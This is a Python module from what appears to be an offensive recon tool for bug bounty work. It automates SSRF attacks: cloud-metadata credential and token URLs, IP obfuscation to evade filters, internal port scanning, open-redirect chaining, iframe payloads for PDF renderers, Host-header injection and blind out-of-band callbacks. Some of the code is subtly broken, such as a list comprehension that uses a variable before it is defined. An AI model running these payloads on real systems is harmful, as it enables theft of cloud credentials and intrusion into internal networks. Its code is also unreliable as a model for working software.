"""
SSRF Discovery Module.

Techniques (based on real bug bounty research):
  1. Parameter fuzzer — test SSRF-classified params with cloud metadata + interactsh
  2. Cloud metadata probing — AWS 169.254.169.254, GCP, Azure IMDS
  3. Blind SSRF — interactsh out-of-band callback detection
  4. Filter bypass engine — IP obfuscation (decimal, octal, hex, IPv6)
  5. Open redirect chaining — trusted domain → internal IP
  6. Internal port scanner — discover hidden services via SSRF
  7. PDF generator detection — wkhtmltopdf, headless chrome endpoint patterns
  8. Header injection — Host, X-Forwarded-Host SSRF vectors
"""
from __future__ import annotations

import asyncio
import re
from collections.abc import AsyncIterator
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from reconify.modules.base import BaseModule

# ── Cloud Metadata Endpoints ───────────────────────────────────────────────────

AWS_METADATA = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
]

GCP_METADATA = [
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://169.254.169.254/computeMetadata/v1/",
]

AZURE_METADATA = [
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
]

# ── IP Obfuscation Variants of 127.0.0.1 + metadata IP ────────────────────────

def _ip_variants(ip: str) -> list[str]:
    """Generate obfuscated forms of an IP for filter bypass."""
    parts = ip.split(".")
    if len(parts) != 4:
        return [ip]
    a, b, c, d = [int(x) for x in parts]
    decimal = (a << 24) | (b << 16) | (c << 8) | d
    octal = ".".join(f"0{oct(int(p))[2:]}" for p in parts)
    hex_ip = hex(decimal)
    return [
        ip,
        str(decimal),           # decimal: 2130706433
        octal,                  # octal:   0177.00.00.01
        hex_ip,                 # hex:     0x7f000001
        f"[::ffff:{ip}]",       # IPv6 mapped
        "::1" if ip == "127.0.0.1" else ip,
        f"0x{decimal:08x}",
    ]

# ── SSRF Test Payloads ─────────────────────────────────────────────────────────

# Localhost variants
LOCALHOST_VARIANTS = _ip_variants("127.0.0.1") + ["localhost", "127.1", "127.0.1"]

# AWS metadata IP variants
METADATA_VARIANTS = _ip_variants("169.254.169.254") + [
    "169.254.169.254",
    "0xa9fea9fe",  # hex
]

# Common internal ports to scan via SSRF
INTERNAL_PORTS = [22, 80, 443, 3000, 3306, 4444, 5432, 5984, 6379, 6380,
                  8000, 8080, 8443, 8888, 9000, 9200, 9300, 11211, 27017]

# Patterns that suggest a PDF/webhook endpoint
PDF_PATTERNS = [r"/pdf", r"/export", r"/print", r"/render", r"/generate",
                r"/convert", r"/report", r"/download", r"wkhtmlto", r"puppeteer"]

WEBHOOK_PATTERNS = [r"/webhook", r"/notify", r"/callback", r"/hook",
                    r"/ping", r"/trigger", r"/event", r"/integration"]


class SsrfModule(BaseModule):
    name = "ssrf"

    async def run(self) -> AsyncIterator[dict]:
        interactsh_url = self.config.get("interactsh_url", "")

        async with httpx.AsyncClient(
            follow_redirects=False,   # don't follow — we want to detect SSRF ourselves
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 reconify/0.1"},
            timeout=10,
        ) as client:

            params = await self._load_params()
            ssrf_params = [p for p in params if p.param_type in ("ssrf", "redirect")]

            # 1. Blind SSRF with interactsh (most reliable)
            if interactsh_url:
                async for result in self._blind_ssrf(client, ssrf_params, interactsh_url):
                    yield result

            # 2. Cloud metadata probing (direct)
            async for result in self._metadata_probe(client, ssrf_params):
                yield result

            # 3. Internal port scan via SSRF
            async for result in self._internal_port_scan(client, ssrf_params):
                yield result

            # 4. Open redirect → SSRF chaining
            async for result in self._open_redirect_chain(client, ssrf_params):
                yield result

            # 5. Detect PDF/webhook endpoints susceptible to SSRF
            async for result in self._detect_pdf_webhooks():
                yield result

            # 6. Host header injection SSRF
            async for result in self._host_header_ssrf(client, interactsh_url):
                yield result

    # ── Blind SSRF ─────────────────────────────────────────────────────────────

    async def _blind_ssrf(
        self, client: httpx.AsyncClient, params: list, callback_url: str
    ) -> AsyncIterator[dict]:
        sem = asyncio.Semaphore(self.config.get("threads", 20))

        async def test(p, payload: str):
            async with sem:
                try:
                    url = _inject_param(p.url, p.param, payload)
                    await client.get(url, timeout=8)
                    return {
                        "type": "ssrf_finding",
                        "url": p.url,
                        "param": p.param,
                        "payload": payload,
                        "finding_type": "blind",
                        "callback_id": callback_url,
                        "metadata_path": None,
                        "confirmed": False,
                    }
                except Exception:
                    return None

        tasks = [test(p, callback_url) for p in ssrf_params[:50]
                 for ssrf_params in [params]]
        # Also test with IP-obfuscated localhost
        for p in params[:20]:
            for variant in LOCALHOST_VARIANTS[:3]:
                tasks.append(test(p, f"http://{variant}:80/"))

        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                yield result

    # ── Cloud Metadata ─────────────────────────────────────────────────────────

    async def _metadata_probe(self, client: httpx.AsyncClient, params: list) -> AsyncIterator[dict]:
        sem = asyncio.Semaphore(10)
        metadata_endpoints = AWS_METADATA + GCP_METADATA + AZURE_METADATA

        async def probe(p, endpoint: str, cloud: str) -> dict | None:
            async with sem:
                try:
                    headers = {}
                    if cloud == "gcp":
                        headers["Metadata-Flavor"] = "Google"
                    elif cloud == "azure":
                        headers["Metadata"] = "true"

                    url = _inject_param(p.url, p.param, endpoint)
                    r = await client.get(url, headers=headers, timeout=8)
                    # Success indicators: metadata content in response
                    if _looks_like_metadata(r.text, cloud):
                        return {
                            "type": "ssrf_finding",
                            "url": p.url,
                            "param": p.param,
                            "payload": endpoint,
                            "finding_type": "metadata",
                            "callback_id": None,
                            "metadata_path": endpoint,
                            "confirmed": True,
                        }
                except Exception:
                    pass
            return None

        for p in params[:30]:
            for endpoint in AWS_METADATA[:2]:
                result = await probe(p, endpoint, "aws")
                if result:
                    yield result
                # Try obfuscated variants
                for variant in METADATA_VARIANTS[1:4]:
                    ep = endpoint.replace("169.254.169.254", variant)
                    result = await probe(p, ep, "aws")
                    if result:
                        yield result
            for endpoint in GCP_METADATA[:1]:
                result = await probe(p, endpoint, "gcp")
                if result:
                    yield result
            for endpoint in AZURE_METADATA[:1]:
                result = await probe(p, endpoint, "azure")
                if result:
                    yield result

    # ── Internal Port Scan ─────────────────────────────────────────────────────

    async def _internal_port_scan(self, client: httpx.AsyncClient, params: list) -> AsyncIterator[dict]:
        if not params:
            return
        p = params[0]  # Use first SSRF param for port scan
        sem = asyncio.Semaphore(20)

        async def probe_port(port: int) -> dict | None:
            async with sem:
                for ip in ["127.0.0.1", "localhost"]:
                    payload = f"http://{ip}:{port}/"
                    try:
                        url = _inject_param(p.url, p.param, payload)
                        r = await client.get(url, timeout=5)
                        # Connection refused = port closed, other status = open
                        if r.status_code not in (0, 502, 503):
                            return {
                                "type": "ssrf_finding",
                                "url": p.url,
                                "param": p.param,
                                "payload": payload,
                                "finding_type": "internal_port",
                                "callback_id": None,
                                "metadata_path": f"127.0.0.1:{port} (HTTP {r.status_code})",
                                "confirmed": False,
                            }
                    except httpx.ConnectError:
                        pass  # port closed
                    except Exception:
                        pass
            return None

        tasks = [probe_port(port) for port in INTERNAL_PORTS]
        for coro in asyncio.as_completed(tasks):
            result = await coro
            if result:
                yield result

    # ── Open Redirect Chaining ─────────────────────────────────────────────────

    async def _open_redirect_chain(self, client: httpx.AsyncClient, params: list) -> AsyncIterator[dict]:
        """
        Find open redirects on discovered subdomains and chain them with SSRF params.
        open_redirect: https://trusted.com/redirect?url=http://169.254.169.254/
        """
        try:
            from reconify.core.storage import get_session, Subdomain, Url
            from sqlmodel import select
            with get_session(self.db_path) as s:
                urls = list(s.exec(
                    select(Url)
                    .where(Url.scan_id == self.scan_id)
                    .where(Url.source != "ffuf")
                ).all())
        except Exception:
            return

        # Find redirect-like URLs
        redirect_params = {"url", "next", "redirect", "goto", "return", "dest", "redir", "back"}
        redirect_candidates = []
        for u in urls:
            parsed = urlparse(u.url)
            qs = parse_qs(parsed.query)
            for rp in redirect_params:
                if rp in qs:
                    redirect_candidates.append((u.url, rp))

        if not redirect_candidates or not params:
            return

        sem = asyncio.Semaphore(10)
        for base_url, rp in redirect_candidates[:10]:
            for meta_endpoint in [AWS_METADATA[0], "http://169.254.169.254/"]:
                async with sem:
                    try:
                        # Build open redirect URL
                        open_redir_url = _inject_param(base_url, rp, meta_endpoint)
                        r = await client.get(open_redir_url, timeout=8)
                        if r.status_code in (301, 302, 307, 308):
                            location = r.headers.get("location", "")
                            if "169.254" in location or "metadata" in location.lower():
                                # Now chain with SSRF params
                                for p in params[:5]:
                                    yield {
                                        "type": "ssrf_finding",
                                        "url": p.url,
                                        "param": p.param,
                                        "payload": open_redir_url,
                                        "finding_type": "open_redirect_chain",
                                        "callback_id": None,
                                        "metadata_path": location,
                                        "confirmed": True,
                                    }
                    except Exception:
                        pass

    # ── PDF / Webhook Detection ────────────────────────────────────────────────

    async def _detect_pdf_webhooks(self) -> AsyncIterator[dict]:
        """Flag URLs that pattern-match as PDF generators or webhook receivers — high-value SSRF targets."""
        try:
            from reconify.core.storage import get_session, Url
            from sqlmodel import select
            with get_session(self.db_path) as s:
                urls = list(s.exec(select(Url).where(Url.scan_id == self.scan_id)).all())
        except Exception:
            return

        for u in urls:
            url_lower = u.url.lower()
            for pattern in PDF_PATTERNS:
                if re.search(pattern, url_lower):
                    yield {
                        "type": "ssrf_finding",
                        "url": u.url,
                        "param": "body/template",
                        "payload": "<iframe src='http://169.254.169.254/latest/meta-data/'>",
                        "finding_type": "blind",
                        "callback_id": None,
                        "metadata_path": "PDF generator — inject HTML to trigger SSRF",
                        "confirmed": False,
                    }
                    break
            for pattern in WEBHOOK_PATTERNS:
                if re.search(pattern, url_lower):
                    yield {
                        "type": "ssrf_finding",
                        "url": u.url,
                        "param": "webhook_url",
                        "payload": "http://169.254.169.254/latest/meta-data/",
                        "finding_type": "blind",
                        "callback_id": None,
                        "metadata_path": "Webhook endpoint — supply internal IP as callback",
                        "confirmed": False,
                    }
                    break

    # ── Host Header SSRF ──────────────────────────────────────────────────────

    async def _host_header_ssrf(
        self, client: httpx.AsyncClient, callback_url: str
    ) -> AsyncIterator[dict]:
        """Test Host and X-Forwarded-Host header injection for SSRF."""
        internal_hosts = ["169.254.169.254", "localhost", "127.0.0.1"]
        if callback_url:
            parsed = urlparse(callback_url)
            internal_hosts.insert(0, parsed.netloc or callback_url)

        for scheme in ("https", "http"):
            url = f"{scheme}://{self.target}/"
            for host_val in internal_hosts[:3]:
                for header in ("X-Forwarded-Host", "X-Host", "X-Original-Host"):
                    try:
                        r = await client.get(
                            url,
                            headers={header: host_val},
                            timeout=8,
                        )
                        if _looks_like_metadata(r.text, "aws") or "169.254" in r.text:
                            yield {
                                "type": "ssrf_finding",
                                "url": url,
                                "param": header,
                                "payload": host_val,
                                "finding_type": "blind",
                                "callback_id": None,
                                "metadata_path": f"Header {header}: {host_val} caused metadata response",
                                "confirmed": True,
                            }
                    except Exception:
                        pass
            break

    # ── DB Helper ─────────────────────────────────────────────────────────────

    async def _load_params(self):
        try:
            from reconify.core.storage import get_session, Parameter
            from sqlmodel import select
            with get_session(self.db_path) as s:
                return list(s.exec(
                    select(Parameter).where(Parameter.scan_id == self.scan_id)
                ).all())
        except Exception:
            return []


# ── Helpers ────────────────────────────────────────────────────────────────────

def _inject_param(base_url: str, param: str, value: str) -> str:
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def _looks_like_metadata(text: str, cloud: str) -> bool:
    indicators = {
        "aws": ["ami-id", "instance-id", "security-credentials", "iam", "meta-data"],
        "gcp": ["computeMetadata", "project-id", "service-accounts", "access_token"],
        "azure": ["compute", "subscriptionId", "resourceGroupName", "access_token"],
    }
    checks = indicators.get(cloud, []) + indicators.get("aws", [])
    text_lower = text.lower()
    return any(c.lower() in text_lower for c in checks)
